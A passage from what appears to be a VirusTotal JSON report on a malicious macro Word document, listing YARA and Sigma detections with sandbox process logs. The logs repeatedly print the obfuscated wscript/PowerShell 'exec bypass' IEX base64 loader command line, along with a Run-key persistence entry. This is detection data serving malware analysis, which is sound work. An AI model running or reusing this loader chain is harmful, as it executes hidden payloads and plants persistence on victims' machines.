{
    "data":  {
                 "id":  "93b749082651d7fc0b3caa9df81bad7617b3bd4475de58acfe953dfafc7b3987",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/93b749082651d7fc0b3caa9df81bad7617b3bd4475de58acfe953dfafc7b3987"
                           },
                 "attributes":  {
                                    "available_tools":  [
                                                            "sigcheck"
                                                        ],
                                    "crowdsourced_yara_results":  [
                                                                      {
                                                                          "ruleset_id":  "01234b2177",
                                                                          "rule_name":  "Office_Document_with_VBA_Project",
                                                                          "ruleset_name":  "Office_Document_with_VBA_Project",
                                                                          "description":  "This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.",
                                                                          "author":  "InQuest Labs",
                                                                          "match_date":  1765613195,
                                                                          "ruleset_version":  "01234b2177|589bbefc22847193cac455858fa15e627d671918",
                                                                          "source":  "https://github.com/InQuest/yara-rules-vt"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "00cd20741a",
                                                                          "rule_name":  "INDICATOR_DOC_PhishingPatterns",
                                                                          "ruleset_name":  "indicator_office",
                                                                          "description":  "Detects OLE, RTF, PDF and OOXML (decompressed) documents with common phishing strings",
                                                                          "author":  "ditekSHen",
                                                                          "match_date":  1765613195,
                                                                          "ruleset_version":  "00cd20741a|e76c93dcdedff04076380ffc60ea54e45b313635",
                                                                          "source":  "https://github.com/ditekshen/detection"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000f991ab2",
                                                                          "rule_name":  "SUSP_EnableContent_String_Gen",
                                                                          "ruleset_name":  "gen_susp_office_dropper",
                                                                          "description":  "Detects suspicious string that asks to enable active content in Office Doc",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "match_date":  1765613195,
                                                                          "ruleset_version":  "000f991ab2|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "00f0c882fa",
                                                                          "rule_name":  "suspicious_powershell_winword",
                                                                          "ruleset_name":  "Word_PS_Downloader",
                                                                          "match_date":  1765613195,
                                                                          "ruleset_version":  "00f0c882fa|5385ebdd2262ba55537ad4729ec36856cb5c6043",
                                                                          "source":  "https://github.com/securitymagic/yara"
                                                                      }
                                                                  ],
                                    "meaningful_name":  "93b749082651d7fc0b3caa9df81bad7617b3bd4475de58acfe953dfafc7b3987.unknown",
                                    "sha1":  "b0ab6ce3d044a1339a705f233e113c44a1bced10",
                                    "tags":  [
                                                 "calls-wmi",
                                                 "doc",
                                                 "macros",
                                                 "create-ole",
                                                 "long-sleeps",
                                                 "persistence",
                                                 "obfuscated",
                                                 "auto-create",
                                                 "auto-open"
                                             ],
                                    "sigma_analysis_summary":  {
                                                                   "Sigma Integrated Rule Set (GitHub)":  {
                                                                                                              "high":  1,
                                                                                                              "medium":  3,
                                                                                                              "critical":  0,
                                                                                                              "low":  0
                                                                                                          },
                                                                   "Joe Security Rule Set (GitHub)":  {
                                                                                                          "high":  0,
                                                                                                          "medium":  0,
                                                                                                          "critical":  1,
                                                                                                          "low":  0
                                                                                                      }
                                                               },
                                    "unique_sources":  8,
                                    "magika":  "DOC",
                                    "ssdeep":  "12288:iP/HOjaQ3UMq+jE5SWNGyfV0djZpDGCDJVXDdJsn:scEMq+jE5SW0OEj7Dz9kn",
                                    "vhash":  "e2dc95b9129ca8c9dd12235269cbe13a",
                                    "first_submission_date":  1552389576,
                                    "tlsh":  "T174A4E1213784ED3AC68569B24D1FC8C0A354BE06EF408A6776547F3FAF39B6819CB244",
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A25-6410-FD05-000000004600}; ProcessId=5044; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7A25-6410-FC05-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=4004; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0027JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp\u0027)))\"\"\"; EventID=1; LogonGuid=C784477D-7B1A-6407-2DED-030000000000; LogonId=257325; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding; UtcTime=1678801445; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A2D-6410-0006-000000004600}; ProcessId=6596; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7A2D-6410-FF05-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=2956; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0027JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp\u0027)))\"\"\"; EventID=1; LogonGuid=C784477D-7B1A-6407-2DED-030000000000; LogonId=257325; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding; UtcTime=1678801453; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "critical",
                                                                       "rule_id":  "d77da6b7c1a6f6530b4eb82ca84407ff02947b235ab29c94eade944c4f51e499",
                                                                       "rule_source":  "Joe Security Rule Set (GitHub)",
                                                                       "rule_title":  "Powershell Decrypt And Execute Base64 Data",
                                                                       "rule_description":  "powershell decrypts and execute hardcoded base64 blob",
                                                                       "rule_author":  "Joe Security"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A25-6410-FD05-000000004600}; ProcessId=5044; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7A25-6410-FC05-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=4004; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0027JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp\u0027)))\"\"\"; EventID=1; LogonGuid=C784477D-7B1A-6407-2DED-030000000000; LogonId=257325; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding; UtcTime=1678801445; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A2D-6410-0006-000000004600}; ProcessId=6596; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7A2D-6410-FF05-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=2956; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0027JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp\u0027)))\"\"\"; EventID=1; LogonGuid=C784477D-7B1A-6407-2DED-030000000000; LogonId=257325; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding; UtcTime=1678801453; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "96d2c399118cab5d249093badf4a85f0ef1889872b0191bdf131bcabc0994681",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Script Execution From Temp Folder",
                                                                       "rule_description":  "Detects a suspicious script executions from temporary folder",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A25-6410-FD05-000000004600}; ProcessId=5044; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7A25-6410-FC05-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=4004; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0027JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp\u0027)))\"\"\"; EventID=1; LogonGuid=C784477D-7B1A-6407-2DED-030000000000; LogonId=257325; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding; UtcTime=1678801445; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A2D-6410-0006-000000004600}; ProcessId=6596; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7A2D-6410-FF05-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=2956; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\u0027JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp\u0027)))\"\"\"; EventID=1; LogonGuid=C784477D-7B1A-6407-2DED-030000000000; LogonId=257325; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding; UtcTime=1678801453; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "06b48fa7870d38bdf92b4d4a9b9c4a4df779bd405fdc5ba0e70911df20027ce1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Change PowerShell Policies to an Insecure Level",
                                                                       "rule_description":  "Detects use of executionpolicy option to set insecure policies",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=2900; EventType=SetValue; Image=C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE; ProcessGuid={C784477D-7A15-6410-FA05-000000004600}; UtcTime=1678801431; Details=c:\\windows\\explorer.exe shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-7A0D-6410-F705-000000004600}; ProcessId=3168; Product=Microsoft Office 2016; Description=Microsoft Word; Company=Microsoft Corporation; ParentProcessGuid={C784477D-7B16-6407-0E00-000000004600}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D; OriginalFileName=WinWord.exe; ParentImage=C:\\Windows\\System32\\svchost.exe; FileVersion=16.0.4266.1001; ParentProcessId=844; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding; EventID=1; LogonGuid=C784477D-7B1A-6407-ECEC-030000000000; LogonId=257260; Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p; UtcTime=1678801421; RuleName=-}"
                                                                                             },
